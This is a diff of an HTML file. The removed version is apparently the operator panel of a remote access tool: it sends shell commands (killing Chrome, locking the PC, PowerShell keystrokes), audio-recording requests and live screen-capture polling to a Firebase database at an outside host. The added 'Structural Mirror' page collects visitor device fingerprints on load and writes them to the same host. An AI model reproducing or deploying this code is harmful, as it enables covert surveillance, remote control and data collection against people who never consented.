@@ -1,136 +1,94 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>A0Z CORE v10.0 - ULTIMATE CONTROL</title>
-<style>
-:root { --neon: #00ff41; --red: #ff003c; --blue: #008cff; --orange: #ffaa00; --bg: #050505; }
-body { background: var(--bg); color: var(--neon); font-family: 'Segoe UI', sans-serif; display: flex; height: 100vh; margin: 0; overflow: hidden; }
-
-.sidebar { width: 240px; background: #080808; border-right: 1px solid #222; padding: 15px; overflow-y: auto; }
-.sidebar h3 { font-size: 0.7rem; color: #555; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid #222; padding-bottom: 5px; margin-top: 20px; }
-
-.main { flex: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; background: radial-gradient(circle at center, #0a0a0a 0%, #050505 100%); }
-
-.monitor { width: 100%; max-width: 800px; height: 450px; border: 2px solid var(--neon); background: #000; position: relative; border-radius: 10px; box-shadow: 0 0 20px rgba(0,255,65,0.1); overflow: hidden; }
-#screenImg { width: 100%; height: 100%; object-fit: contain; display: none; }
-
-.audio-zone { width: 100%; max-width: 800px; margin-top: 10px; display: none; text-align: center; background: #111; padding: 10px; border-radius: 5px; border: 1px solid var(--orange); }
-
-.input-area { width: 100%; max-width: 800px; margin-top: 20px; display: flex; gap: 10px; }
-input { flex: 1; background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; border-radius: 5px; outline: none; }
-
-button { background: transparent; border: 1px solid var(--neon); color: var(--neon); padding: 8px 12px; cursor: pointer; font-size: 0.7rem; font-weight: bold; border-radius: 4px; transition: 0.2s; width: 100%; margin-bottom: 5px; text-align: left; }
-button:hover { background: var(--neon); color: #000; box-shadow: 0 0 10px var(--neon); }
-button.cmd-btn { border-color: var(--blue); color: var(--blue); }
-button.cmd-btn:hover { background: var(--blue); color: #fff; }
-button.danger-btn { border-color: var(--red); color: var(--red); }
-button.danger-btn:hover { background: var(--red); color: #fff; }
-button.warn-btn { border-color: var(--orange); color: var(--orange); }
-button.warn-btn:hover { background: var(--orange); color: #000; }
-
-.status-bar { margin-top: 15px; font-size: 0.7rem; font-family: monospace; color: #444; }
-</style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>A∞Z | Structural Mirror</title>
+    <style>
+        body {
+            background-color: #000000;
+            color: #00ffcc;
+            font-family: "Courier New", Courier, monospace;
+            padding: 2em;
+            margin: 0;
+            overflow: hidden;
+        }
+        .line {
+            margin-bottom: 0.8em;
+            opacity: 0;
+            animation: fadeIn 0.5s forwards;
+            word-break: break-all;
+        }
+        .highlight {
+            color: #ff0033;
+        }
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+    </style>
 </head>
 <body>
+    <div id="output"></div>
 
-<div class="sidebar">
-<div style="color: var(--neon); font-weight: bold; margin-bottom: 20px; font-size: 1.2rem;">A0Z CORE</div>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";
 
-<h3>Surveillance</h3>
-<button class="warn-btn" onclick="requestAudio()">🎙️ Record Audio (10s)</button>
+        const firebaseConfig = {
+            databaseURL: "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/"
+        };
 
-<h3>Sound & Voice</h3>
-<button class="danger-btn" onclick="send('/cmd powershell -c \'$obj = New-Object -ComObject WScript.Shell; for($i=0; $i -lt 50; $i++) { $obj.SendKeys([char]175) }\'')">🔊 MAX VOLUME</button>
-<button onclick="send('/say Hello, I am watching you')">📢 Say Hello</button>
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const ua = navigator.userAgent;
+        const platform = navigator.platform || "Unknown";
+        const width = window.screen.width;
+        const height = window.screen.height;
+        const cores = navigator.hardwareConcurrency || "N/A";
+        const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "N/A";
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const language = navigator.language || "N/A";
 
-<h3>Fun Tactics</h3>
-<button class="cmd-btn" onclick="send('/cmd start https://www.youtube.com/watch?v=dQw4w9WgXcQ')">🎵 Rickroll</button>
-<button class="cmd-btn" onclick="send('/cmd msg * Your PC is possessed!')">💬 Pop-up Message</button>
-<button onclick="send('/type Hacked by A0Z Core.')">⌨️ Type Ghost Message</button>
+        const sessionId = btoa(ua + width + height).slice(0, 16);
 
-<h3>System</h3>
-<button class="danger-btn" onclick="send('/cmd taskkill /f /im chrome.exe')">🚫 Kill Chrome</button>
-<button class="danger-btn" onclick="send('/cmd rundll32.exe user32.dll,LockWorkStation')">🔒 Lock PC</button>
-</div>
+        const telemetryData = {
+            sessionId: sessionId,
+            platform: platform,
+            resolution: `${width}x${height}`,
+            cores: cores,
+            memory: memory,
+            timezone: timezone,
+            language: language,
+            userAgent: ua,
+            timestamp: new Date().toISOString()
+        };
 
-<div class="main">
-<div class="monitor">
-<img id="screenImg" src="">
-<div id="loading" style="position:absolute; top:50%; left:50%; transform:translate(-50%, -50%);">SEARCHING FOR SIGNAL...</div>
-</div>
+        const sessionsRef = ref(db, 'mirror_sessions/' + sessionId);
+        set(sessionsRef, telemetryData).catch(() => {});
 
-<div id="audioContainer" class="audio-zone">
-<span style="font-size: 0.6rem; color: var(--orange); font-weight: bold;">LIVE AUDIO RECEIVED</span><br>
-<audio id="audioPlayer" controls style="height: 30px; width: 100%;"></audio>
-</div>
+        const lines = [
+            "<span class='highlight'>[ A∞ZAI Structural Mirror v3.0 ]</span>",
+            "Establishing background handshake...",
+            "----------------------------------------",
+            "Session ID: " + sessionId,
+            "Platform: " + platform,
+            "Screen Resolution: " + width + "x" + height,
+            "Hardware Cores: " + cores,
+            "Estimated RAM: " + memory,
+            "Timezone: " + timezone,
+            "Status: <span class='highlight'>SYNCED TO CONTROL PANEL</span>",
+            "----------------------------------------"
+        ];
 
-<div class="input-area">
-<input type="text" id="manualInput" placeholder="Enter message or command...">
-<button style="width: auto;" onclick="send('/say ' + document.getElementById('manualInput').value)">SAY</button>
-<button style="width: auto;" class="cmd-btn" onclick="send('/cmd ' + document.getElementById('manualInput').value)">CMD</button>
-<button style="width: auto;" onclick="send('/type ' + document.getElementById('manualInput').value)">TYPE</button>
-</div>
-
-<div class="status-bar" id="log">SYSTEM STATUS: READY</div>
-</div>
-
-<script>
-const DB_URL = "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/A0Z_CORE";
-
-async function send(text) {
-if(!text) return;
-document.getElementById('log').innerText = "SENDING: " + text;
-try {
-await fetch(`${DB_URL}/current_command.json`, {
-method: 'PUT',
-body: JSON.stringify({ text: text, timestamp: Date.now() })
-});
-document.getElementById('log').innerText = "SUCCESS: " + text;
-document.getElementById('log').style.color = "var(--neon)";
-} catch (e) {
-document.getElementById('log').innerText = "FAILED TO CONNECT";
-document.getElementById('log').style.color = "var(--red)";
-}
-}
-
-async function requestAudio() {
-send('/record');
-document.getElementById('log').innerText = "RECORDING IN PROGRESS... PLEASE WAIT";
-setTimeout(fetchAudio, 12000);
-}
-
-async function fetchAudio() {
-try {
-const response = await fetch(`${DB_URL}/audio_data.json`);
-const data = await response.json();
-if (data && data.audio) {
-const player = document.getElementById('audioPlayer');
-player.src = "data:audio/wav;base64," + data.audio;
-document.getElementById('audioContainer').style.display = "block";
-player.play();
-document.getElementById('log').innerText = "AUDIO SYNCED SUCCESSFULLY";
-}
-} catch (err) {
-document.getElementById('log').innerText = "AUDIO DATA NOT READY";
-}
-}
-
-async function updateMonitor() {
-try {
-const response = await fetch(`${DB_URL}/live_screen.json`);
-const data = await response.json();
-if (data && data.image) {
-const img = document.getElementById('screenImg');
-img.src = "data:image/jpeg;base64," + data.image;
-img.style.display = "block";
-document.getElementById('loading').style.display = "none";
-}
-} catch (err) {}
-}
-
-setInterval(updateMonitor, 2000);
-</script>
-
+        const container = document.getElementById("output");
+        lines.forEach((line, index) => {
+            setTimeout(() => {
+                const div = document.createElement("div");
+                div.className = "line";
+                div.innerHTML = line;
+                container.appendChild(div);
+            }, index * 300);
+        });
+    </script>
 </body>
 </html>
